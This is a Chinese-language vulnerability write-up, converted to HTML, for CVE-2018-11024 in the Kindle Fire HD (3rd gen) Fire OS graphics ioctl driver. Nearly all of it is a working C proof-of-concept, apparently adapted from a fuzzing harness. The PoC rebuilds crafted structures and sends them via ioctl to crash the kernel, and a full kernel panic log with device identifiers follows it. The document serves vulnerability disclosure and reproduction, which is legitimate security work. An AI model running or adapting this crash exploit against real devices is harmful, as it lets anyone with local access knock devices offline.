<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</h1><h2>一、漏洞简介</h2><p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令1077435789并导致内核崩溃。</p><h2>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p><h2>三、复现过程</h2><h3>poc</h3><p>#include&lt;stdio.h&gt;<br />#include&lt;string.h&gt;      //strlen<br />#include&lt;sys/socket.h&gt;<br />#include&lt;arpa/inet.h&gt; //inet_addr<br />#include&lt;unistd.h&gt;      //write<br />#include &lt;stdlib.h&gt;<br />#include &lt;sys/stat.h&gt;<br />#include &lt;sys/mman.h&gt;<br />#include &lt;fcntl.h&gt;<br />#include &lt;stdbool.h&gt;<br /><br />// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/<br /><br />/*<br /> seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs<br />*/<br />int debug = 1;<br /><br />typedef struct {<br />    int src_id;<br />    int dst_id;<br />    int offset;<br />} map_entry_t;<br /><br />short tiny_vals[18] = {128, 127, 64, 63, 32, 31, 16, 15, 8, 7, 4, 3, 2, 1, 0, 256, 255, -1};<br />int *small_vals;<br />int num_small_vals;<br /><br />// populates small_vals when called<br />void populate_arrs(int top) {<br />    int num = 1;<br />    int count = 0;<br />    while (num &lt; top) {<br />        //printf("%d\n", num);<br />        num &lt;&lt;= 1;<br />        count += 2;<br />    }<br />    // top<br />    count += 1;<br />    // -1<br />    count += 1;<br />    num_small_vals = count;<br />    num &gt;&gt;= 1;<br /><br />    small_vals = malloc(sizeof(int)*count);<br />    memset(small_vals, 0, count);<br /><br />    int i = 0;<br />    while(num &gt; 1) {<br />        small_vals[i] = num;<br />        i++;<br />        small_vals[i] = num-1;<br />        i++;<br />        num &gt;&gt;= 1;<br />    }<br />    small_vals[i] = 0;<br />    small_vals[i+1] = top;<br />    small_vals[i+2] = top-1;<br />    small_vals[i+3] = -1;<br />}<br /><br />// generate a random value of size size and store it in elem.<br />// value has a weight % chance to be a "small value"<br />void gen_rand_val(int size, char *elem,  int small_weight) {<br />    int i;<br /><br />    if ((rand() % 100) &lt; small_weight) {<br />        // do small thing<br />        unsigned int idx = (rand() % num_small_vals);<br />        printf("Choosing %d\n", small_vals[idx]);<br />        switch (size) {<br />            case 2:<br />                idx = (rand() % 18);<br />                *(short *)elem = tiny_vals[idx];<br />                break;<br />            case 4:<br />                *(int *)elem = small_vals[idx];<br />                break;<br /><br />            case 8:<br />                *(long long*)elem = small_vals[idx];<br />                break;<br /><br />            default:<br />                printf("Damn bro. Size: %d\n", size);<br />                exit(-1);<br />        }<br />    }<br /><br />    else {<br /><br />        for(i=0; i &lt; size; i++) {<br />            elem[i] = (char)(rand()%0x100);<br />        }<br />    }<br /><br />}<br /><br />int main(int argc , char *argv[])<br />{<br />    int num_blobs = 0, num_mappings = 0, i = 0, dev_name_len = 0, j;<br />    unsigned int ioctl_id = 0;<br />    char *dev_name;<br />    void *tmp;<br />    char **ptr_arr;<br />    int *len_arr;<br />    unsigned int seed;<br /><br />    int sockfd , client_sock , c , read_size;<br />    struct sockaddr_in server , client;<br />    int msg_size;<br />    void *generic_arr[264];<br /><br />    // max val for small_vals array<br />    int top = 8192;<br />    int cnt = 0;<br />    // chance that our generics are filled with "small vals"<br />    int default_weight = 50;<br />    populate_arrs(top);<br />    int retest = 1;<br />    goto rerun;<br /><br /><br /><br />    sockfd = socket(AF_INET , SOCK_STREAM , 0);<br />    if (sockfd == -1)<br />    {<br />        printf("Could not create socket");<br />    }<br />    puts("Socket created");<br /><br />    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int){ 1 }, sizeof(int));<br /><br />    server.sin_family = AF_INET;<br />    server.sin_addr.s_addr = INADDR_ANY;<br />    server.sin_port = htons(atoi(argv[1]));<br /><br />    //Bind<br />    if( bind(sockfd,(struct sockaddr *)&amp;server , sizeof(server)) &lt; 0)<br />    {<br />        //print the error message<br />        perror("bind failed. Error");<br />        return 1;<br />    }<br />    puts("bind done");<br />listen:     <br />    // Listen<br />    listen(sockfd , 3);<br /><br />    puts("Waiting for incoming connections...");<br />    c = sizeof(struct sockaddr_in);<br /><br />    // accept connection from an incoming client<br />    client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (socklen_t*)&amp;c);<br />    if (client_sock &lt; 0)<br />    {<br />        perror("accept failed");<br />        return 1;<br />    }<br />    puts("Connection accepted");<br /><br />    msg_size = 0;<br />    // Receive a message from client<br />    while( (read_size = recv(client_sock , &amp;msg_size , 4 , 0)) &gt; 0 )<br />    {<br />        // recv the entire message<br />        char *recv_buf = calloc(msg_size, sizeof(char));<br />        if (recv_buf == NULL) {<br />            printf("Failed to allocate recv_buf\n");<br />            exit(-1);<br />        }<br /><br />        int nrecvd = recv(client_sock, recv_buf, msg_size, 0);<br />        if (nrecvd != msg_size) {<br />            printf("Error getting all data!\n");<br />            printf("nrecvd: %d\nmsg_size:%d\n", nrecvd, msg_size);<br />            exit(-1);<br />        }<br />        // quickly save a copy of the most recent data<br />        int savefd = open("/sdcard/saved", O_WRONLY|O_TRUNC|O_CREAT, 0644);<br />        if (savefd &lt; 0) {<br />            perror("open saved");<br />            exit(-1);<br />        }<br /><br />        int err = write(savefd, recv_buf, msg_size);<br />        if (err != msg_size) {<br />            perror("write saved");<br />            exit(-1);<br />        }<br />        fsync(savefd);<br />        close(savefd);<br />rerun:<br />        if (retest) {<br />            recv_buf = calloc(msg_size, sizeof(char));<br />            int fd = open("/sdcard/saved", O_RDONLY);<br />            if (fd &lt; 0) {<br />                perror("open:");<br />                exit(-1);<br />            }<br />            int fsize = lseek(fd, 0, SEEK_END);<br />            printf("file size: %d\n", fsize);<br />            lseek(fd, 0, SEEK_SET);<br />            read(fd, recv_buf, fsize);<br />        }<br /><br />        char *head = recv_buf;<br />        seed = 0;<br />        //seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs<br />        memcpy(&amp;seed, head, 4);<br />        head += 4;<br />        memcpy(&amp;ioctl_id, head, 4);<br />        head += 4;<br />        memcpy(&amp;num_mappings, head, 4);<br />        head += 4;<br />        memcpy(&amp;num_blobs, head, 4);<br />        head += 4;<br />        memcpy(&amp;dev_name_len, head, 4);<br />        head += 4;<br /><br />        // srand with new seed<br />        srand(seed);<br /><br />        /* dev name */<br />        dev_name = calloc(dev_name_len+1, sizeof(char));<br />        if (dev_name == NULL) {<br />            printf("Failed to allocate dev_name\n");<br />            exit(-1);<br />        }<br />        memcpy(dev_name, head, dev_name_len);<br />        head += dev_name_len;<br /><br />        /* map */<br />        map_entry_t *map = calloc(num_mappings, sizeof(map_entry_t));<br />        if (map == NULL) {<br />            printf("Failed to allocate map\n");<br />            exit(-1);<br />        }<br /><br />        if (num_mappings != 0) {<br />            memcpy(map, head, num_mappings*sizeof(map_entry_t));<br />            head += num_mappings*sizeof(map_entry_t);<br />        }<br /><br />        /* blobs */<br /><br />        // first create an array to store the sizes themselves<br />        len_arr = calloc(num_blobs, sizeof(int));<br />        if (len_arr == NULL) {<br />            printf("Failed to allocate len_arr\n");<br />            exit(-1);<br />        }<br /><br />        // we'll also want an array to store our pointers<br />        ptr_arr = calloc(num_blobs, sizeof(void *));<br />        if (ptr_arr == NULL) {<br />            printf("Failed to allocate ptr_arr\n");<br />            exit(-1);<br />        }<br /><br /><br />        // copy the blob sizes into our size_arr<br />        for (j=0; j &lt; num_blobs; j++) {<br />            memcpy(&amp;len_arr[j], head, sizeof(int));<br />            head += sizeof(int);<br />        }<br /><br />        // we'll also want memory bufs for all blobs<br />        // now that we have the sizes, allocate all the buffers we need<br />        for (j=0; j &lt; num_blobs; j++) {<br />            ptr_arr[j] = calloc(len_arr[j], sizeof(char));<br />            printf("Sizeof(ptr_arr[%d])=%d\n", j, len_arr[j]);<br />            printf("ptr_arr[%d]=%p\n", j, ptr_arr[j]);<br /><br />            //printf("just added %p to ptr_arr\n", ptr_arr[j]);<br />            if (ptr_arr[j] == NULL) {<br />                printf("Failed to allocate a blob store\n");<br />                exit(-1);<br />            }<br /><br />            // might as well copy the memory over as soon as we allocate the space<br />            memcpy((char *)ptr_arr[j], head, len_arr[j]);<br />            printf("ptr_arr[%d]=\n", j);<br />            for(i=0;i&lt;len_arr[j];i+=4){<br />                printf("0x%08x\n", *(unsigned int *)(ptr_arr[j] + i));<br />            }<br />            printf("\n");<br /><br />            head += len_arr[j];<br />        }<br /><br />        int num_generics = 0;<br /><br />        // time for pointer fixup<br />        for (i=0; i &lt; num_mappings; i++) {<br />            // get out entry<br />            map_entry_t entry = map[i];<br />            // pull out the struct to be fixed up<br />            char *tmp = ptr_arr[entry.src_id];<br /><br />            // check if this is a struct ptr or just a generic one<br /><br />            // just a generic one<br />            if (entry.dst_id &lt; 0) {<br />                // 90% chance we fixup the generic<br />                if ( (rand() % 10) &gt; 0) {<br />                    int buf_len = 128;<br />                    char *tmp_generic = malloc(buf_len);<br />                    memset(tmp_generic, 0, buf_len);<br />                    // 95% chance we fill it with data<br />                    if ((rand() % 100) &gt; 95) {<br />                        // if dst_id is &lt; 0, it's abs value is the element size<br />                        int size = -1 * entry.dst_id;<br />                        int weight;<br />                        // if it's a char or some float, never choose a &quot;small val&quot;<br />                        if (size == 1 || size &gt; 8)<br />                            weight = 0;<br />                        else<br />                            weight = default_weight;<br /><br />                        for (i=0; i &lt; buf_len; i+=size) {<br />                            gen_rand_val(size, &amp;tmp_generic[i], weight);<br />                        }<br />                    }<br />                    generic_arr[num_generics] = tmp_generic;<br />                    memcpy(tmp+entry.offset, &amp;tmp_generic, sizeof(void *));<br />                    num_generics += 1;<br />                    if (num_generics &gt;= 264) {<br />                        printf("Code a better solution for storing generics\n");<br />                        exit(1);<br />                    }<br />                }<br />            }<br /><br />            // a struct ptr, so we have the data<br />            else {<br />                // 1 in 400 chance we don't fixup<br />                if ( (rand() % 400) &gt; 0) {<br />                    // now point it to the correct struct/blob<br />                    // printf("placing %p, at %p\n", ptr_arr[entry.dst_id], tmp+entry.offset);<br />                    memcpy(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], sizeof(void *));<br />                }<br />            }<br />        }<br /><br />        if (debug) {<br />            printf("ioctl_id: %d\n", ioctl_id);<br />            printf("num_mappings: %d\n", num_mappings);<br />            printf("num_blobs: %d\n", num_blobs);<br />            printf("dev_name_len: %d\n", dev_name_len);<br />            printf("dev_name: %s\n", dev_name);<br />            printf("data[]: \n");<br />            //printf("(0x%x)\n", *(int *)&amp;ptr_arr[0]);<br />            printf("(0x%p) : ", &amp;ptr_arr[0]);<br />            printf("(0x%016lx)\n", *(unsigned long int *)ptr_arr[0]);<br />            printf("(0x%p) : ", (&amp;ptr_arr[0]+1*8));<br />            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+1*8));<br /><br />            printf("(0x%p) : ", (&amp;ptr_arr[0]+2*8));<br />            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+2*8));<br /><br />            printf("(0x%p) : ", (&amp;ptr_arr[0]+3*8));<br />            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+3*8));<br /><br />            printf("(0x%p) : ", (&amp;ptr_arr[0]+4*8));<br />            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+4*8));<br /><br />            //printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+5*8));<br />            //printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+6*8));<br /><br />            //printf("(0x%x)\n", (int *)ptr_arr, (int *)ptr_arr);<br /><br />        }<br /><br />        // time for the actual ioctl<br />        //printf("Try to open device %s\n", dev_name);<br />        //fflush(stdout);<br />        int fd = open(dev_name, O_RDONLY);<br />        if (fd &lt; 0) {<br />            perror("open");<br />            exit(-1);<br />        } else {<br />            printf("Open devicd %s successfully.\n", dev_name);<br />        }<br /><br />        //fflush(stdout);<br />        //printf("Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n", fd, ioctl_id, ptr_arr[0]);<br />        fflush(stdout);<br />        printf("%10d:", cnt++);<br />        if ((ioctl(fd, ioctl_id, ptr_arr[0])) == -1)<br />            perror("ioctl");<br /><br />        else<br />            printf("good hit\n");<br />        close(fd);<br />        printf("device %s closed\n", dev_name);<br /><br />        if (retest)<br />            exit(0);<br /><br />        fflush(stdout);<br />        // okay now free all the shit we alloced<br />        free(recv_buf);<br />        free(dev_name);<br />        if (map != NULL)<br />            free(map);<br />        free(len_arr);<br />        for (i=0; i &lt; num_blobs; i++) {<br />            //printf(&quot;%d: free'ing %p\n&quot;, i, ptr_arr[i]);<br />            free(ptr_arr[i]);<br />        }<br />        free(ptr_arr);<br />        for (i=0; i &lt; num_generics; i++) {<br />            free(generic_arr[i]);<br />        }<br /><br />        write(client_sock, &amp;msg_size, 4);<br /><br />        msg_size = 0;<br />    }<br /><br />    if(read_size == 0)<br />    {<br />        puts("Client disconnected");<br />        fflush(stdout);<br />        close(client_sock);<br />        goto listen;<br />    }<br />    else if(read_size == -1)<br />    {<br />        perror("recv failed");<br />    }<br /><br />    return 0;<br />}</p><h3>崩溃日志</h3><p>[  144.428375] Unable to handle kernel paging request at virtual address d900000c<br />[  144.436462] pgd = dcac0000<br />[  144.439697] [d900000c] *pgd=00000000<br />[  144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM<br />[  144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)<br />[  144.457672] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)<br />[  144.465118] PC is at c2dm_l1cache+0x30/0x100<br />[  144.469940] LR is at dev_ioctl+0x3f0/0x10c4<br />[  144.474670] pc : [&lt;c03187ac&gt;]    lr : [&lt;c031782c&gt;]    psr: a0000013<br />[  144.474670] sp : c2d6be38  ip : 00000000  fp : c2d6be6c<br />[  144.487640] r10: 00000000  r9 : d8c0cca8  r8 : 00b8dd90<br />[  144.493621] r7 : 00000000  r6 : c2d6bea4  r5 : 00b8dd90  r4 : 388b77c4<br />[  144.500915] r3 : d9000004  r2 : 75e0c121  r1 : c2d6bea4  r0 : 00000000<br />[  144.508331] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user<br />[  144.516418] Control: 10c5387d  Table: 9cac004a  DAC: 00000015<br />[  144.522827] <br />[  144.522857] PC: 0xc031872c:<br />[  144.527954] 872c  e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd<br />[  144.538482] 874c  eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010<br />[  144.549163] 876c  e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c<br />[  144.559844] 878c  e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000<br />[  144.570404] 87ac  e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003<br />[  144.581085] 87cc  e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008<br />[  144.591735] 87ec  e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001<br />[  144.602416] 880c  e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000<br />[  144.612976] <br />[  144.612976] LR: 0xc03177ac:<br />[  144.618072] 77ac  ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f<br />[  144.628631] 77cc  e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8<br />[  144.639160] 77ec  e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb<br />[  144.649780] 780c  e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3<br />[  144.660369] 782c  e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088<br />[  144.670776] 784c  e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003<br />[  144.681213] 786c  33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f<br />[  144.691528] 788c  e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005<br />[  144.701995] <br />[  144.701995] SP: 0xc2d6bdb8:<br />[  144.706878] bdb8  c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff<br />[  144.717407] bdd8  c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4<br />[  144.727905] bdf8  75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8<br />[  144.738586] be18  00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff<br />[  144.749145] be38  c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90<br />[  144.759796] be58  d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088<br />[  144.770355] be78  000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000<br />[  144.781005] be98  c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261<br />[  144.791687] <br />[  144.791687] FP: 0xc2d6bdec:<br />[  144.796661] bdec  c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4<br />[  144.807189] be0c  00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c<br />[  144.817840] be2c  c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90<br />[  144.828399] be4c  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c<br />[  144.839080] be6c  c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454<br />[  144.849761] be8c  c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f<br />[  144.860290] beac  83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000<br />[  144.870971] becc  00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0<br />[  144.881652] <br />[  144.881652] R1: 0xc2d6be24:<br />[  144.886627] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000<br />[  144.897308] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04<br />[  144.907989] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc<br />[  144.918518] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92<br />[  144.929199] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000<br />[  144.939849] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0<br />[  144.950531] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044<br />[  144.961059] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440<br />[  144.971710] <br />[  144.971710] R3: 0xd8ffff84:<br />[  144.976623] ff84  d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0<br />[  144.987213] ffa4  d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088<br />[  144.997772] ffc4  dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000<br />[  145.008392] ffe4  00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********<br />[  145.018798] 0004  ******** ******** ******** ******** ******** ******** ******** ********<br />[  145.029327] 0024  ******** ******** ******** ******** ******** ******** ******** ********<br />[  145.039886] 0044  ******** ******** ******** ******** ******** ******** ******** ********<br />[  145.050384] 0064  ******** ******** ******** ******** ******** ******** ******** ********<br />[  145.060913] <br />[  145.060913] R6: 0xc2d6be24:<br />[  145.066009] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000<br />[  145.076568] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04<br />[  145.087219] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc<br />[  145.097900] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92<br />[  145.108459] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000<br />[  145.118988] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0<br />[  145.129638] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044<br />[  145.140319] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440<br />[  145.150848] <br />[  145.150848] R9: 0xd8c0cc28:<br />[  145.155944] cc28  d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58<br />[  145.166503] cc48  00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148<br />[  145.177062] cc68  5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000<br />[  145.187713] cc88  00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000<br />[  145.198394] cca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400<br />[  145.208923] ccc8  d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b<br />[  145.219573] cce8  2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000<br />[  145.230255] cd08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24<br />[  145.240936] Process executor32 (pid: 3810, stack limit = 0xc2d6a2f8)<br />[  145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)<br />[  145.253082] be20:                                                       c02ba53c 575b4b92<br />[  145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000<br />[  145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001<br />[  145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8<br />[  145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000<br />[  145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000<br />[  145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08<br />[  145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190<br />[  145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b<br />[  145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b<br />[  145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000<br />[  145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8<br />[  145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90<br />[  145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4<br />[  145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430<br />[  145.390686] Backtrace: <br />[  145.393829] [&lt;c031877c&gt;] (c2dm_l1cache+0x0/0x100) from [&lt;c031782c&gt;] (dev_ioctl+0x3f0/0x10c4)<br />[  145.403228] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)<br />[  145.412658] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)<br />[  145.421874] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)<br />[  145.431304]  r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80<br />[  145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) <br />[  145.450225] Board Information: <br />[  145.450225]  Revision : 0001<br />[  145.450256]  Serial    : 0000000000000000<br />[  145.450256] SoC Information:<br />[  145.450256]  CPU    : OMAP4470<br />[  145.450286]  Rev    : ES1.0<br />[  145.450286]  Type    : HS<br />[  145.450286]  Production ID: 0002B975-000000CC<br />[  145.450286]  Die ID    : 1CC60000-50002FFF-0B00935D-11007004<br />[  145.450317] <br />[  145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---<br />[  145.491149] Kernel panic - not syncing: Fatal exception<br />[  145.496917] CPU1: stopping<br />[  145.500152] Backtrace: <br />[  145.503204] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)<br />[  145.512695]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950<br />[  145.519714] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)<br />[  145.528961] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)<br />[  145.538482] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40/0x60)<br />[  145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)<br />[  145.553466] 5fa0:                                     41822290 418185e8 00000001 41c95000<br />[  145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec<br />[  145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff<br />[  145.579284]  r6:ffffffff r5:200b0010 r4:41609974 r3:41822290<br />[  145.586364] CPU0 PC (0) : 0xc003ee38<br />[  145.590576] CPU0 PC (1) : 0xc003ee54<br />[  145.594635] CPU0 PC (2) : 0xc003ee54<br />[  145.598693] CPU0 PC (3) : 0xc003ee54<br />[  145.602722] CPU0 PC (4) : 0xc003ee54<br />[  145.606781] CPU0 PC (5) : 0xc003ee54<br />[  145.610839] CPU0 PC (6) : 0xc003ee54<br />[  145.614898] CPU0 PC (7) : 0xc003ee54<br />[  145.619110] CPU0 PC (8) : 0xc003ee54<br />[  145.623168] CPU0 PC (9) : 0xc003ee54<br />[  145.627227] CPU1 PC (0) : 0xc0019b2c<br />[  145.631408] CPU1 PC (1) : 0xc0019b2c<br />[  145.635467] CPU1 PC (2) : 0xc0019b2c<br />[  145.639495] CPU1 PC (3) : 0xc0019b2c<br />[  145.643707] CPU1 PC (4) : 0xc0019b2c<br />[  145.647766] CPU1 PC (5) : 0xc0019b2c<br />[  145.651824] CPU1 PC (6) : 0xc0019b2c<br />[  145.656005] CPU1 PC (7) : 0xc0019b2c<br />[  145.660064] CPU1 PC (8) : 0xc0019b2c<br />[  145.664123] CPU1 PC (9) : 0xc0019b2c<br />[  145.668182] <br />[  145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017<br />[  145.669982</p></body></html>